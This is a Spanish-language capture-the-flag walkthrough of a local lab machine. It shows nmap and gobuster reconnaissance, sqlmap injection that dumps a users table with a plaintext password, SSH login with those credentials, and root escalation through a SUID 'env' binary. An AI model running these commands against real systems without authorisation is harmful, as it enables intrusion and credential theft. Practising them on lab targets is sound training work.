Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.
```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 172.17.0.2 -oN escaneo
```
![alt text](image.png)

Al ver que tiene el puerto 80 abierto, entonces iremos al navegador y descubriremos el contenido de este.
![alt text](image-1.png)

Vemos que contiene un login, así que vamos a hacer un fuzzing de este para ver si podemos encontrar algo que nos facilite la entrada a este.
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r --no-error -b 404,403 -x txt,html,php
```
![alt text](image-2.png)

Vemos que no nos muestra nada, así que vamos a intentar realizar un inyección sql.
```
sqlmap -u http://172.17.0.2 --forms -dbs --batch
```
![alt text](image-3.png)

Vemos que con estos párametros hemos obtenido las bases de datos. Ahora intentaremos sacar las tablas.
```
sqlmap -u http://172.17.0.2 --forms -D register --tables --batch
```
![alt text](image-4.png)

Vemos que hemos obtenido las tablas de la base de tatos register, así que vamos a mostrar su contenido.
```
sqlmap -u http://172.17.0.2 --forms -D register -T users --dump --batch
```
![alt text](image-5.png)

Vemos que ya tenemos el usuario `dylan` con la contraseña `KJSDFG789FGSDF78`. Estos los vamos a introducir al login para comprobar que coincide.
![alt text](image-6.png)

Una vez vemos que todo coincide, vamos a intentar por ssh con estas credenciales.
```
ssh dylan@172.17.0.2
password: KJSDFG789FGSDF78
```
![alt text](image-7.png)

Una vez estamos dentro, vamos a intentar conseguir los privilegios de administrador.
```
find / -perm -u=s -type f 2>/dev/null
```
![alt text](image-8.png)

Vemos que el binario env, tiene permisos de administrador, así que lo vamos a explotar para escalar a root.
```
/usr/bin/env /bin/bash -p
```
![alt text](image-9.png)